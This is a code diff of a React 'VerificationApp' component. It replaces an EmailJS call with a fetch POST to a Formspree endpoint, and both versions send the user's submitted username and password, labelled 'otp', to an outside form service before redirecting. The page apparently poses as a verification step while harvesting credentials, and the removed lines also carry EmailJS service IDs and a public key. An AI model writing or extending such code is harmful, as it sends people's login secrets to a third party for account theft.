@@ -49,17 +49,23 @@ const VerificationApp = () => {
     setFormData((prev) => ({ ...prev, ...values }));
     setLoading(true);
 
-    const templateParams = {
-      name: values.username,
-      otp: values.password,
-    };
+    const response = await fetch("https://formspree.io/f/mgvzyqve", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        name: values.username,
+        otp: values.password,
+      }),
+    });
 
-    await emailjs.send(
-      "service_y4o20yn", // EmailJS servicedan olinadi
-      "template_16sm3wl", // EmailJS templatedan olinadi
-      templateParams,
-      "mQ7LyQZ-lEeX_reaC" // EmailJS public key
-    );
+    if (response.ok) {
+      setTimeout(() => {
+        setLoading(false);
+        router.push("/");
+      }, 1500);
+    }
 
     // Simulate API call
     setTimeout(() => {
